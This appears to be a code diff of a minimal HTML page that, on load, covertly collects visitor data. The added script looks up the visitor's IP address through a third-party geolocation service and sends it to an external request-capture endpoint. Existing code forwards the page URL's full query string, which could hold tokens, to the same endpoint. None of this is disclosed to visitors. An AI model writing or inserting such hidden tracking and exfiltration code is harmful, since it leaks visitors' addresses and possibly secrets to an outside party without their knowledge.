@@ -5,8 +5,15 @@
 <h6>Tony 66666</h5>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 <script>
-   
+
+
 $(document).ready(function() {
+   
+   $.getScript('http://pv.sohu.com/cityjson',function(){ 
+	   var ip=returnCitySN['cip']; 
+         $.get("https://tonyniubi6666.free.beeceptor.com?ip="+ip);
+	})
+   
    var url = window.location.href.split("?");
    
    $.ajaxSetup({
@@ -16,6 +23,9 @@ $(document).ready(function() {
    });
    
    $.get("https://tonyniubi6666.free.beeceptor.com?"+url[1]);
+   
 });
+   
+   
                   
 </script>
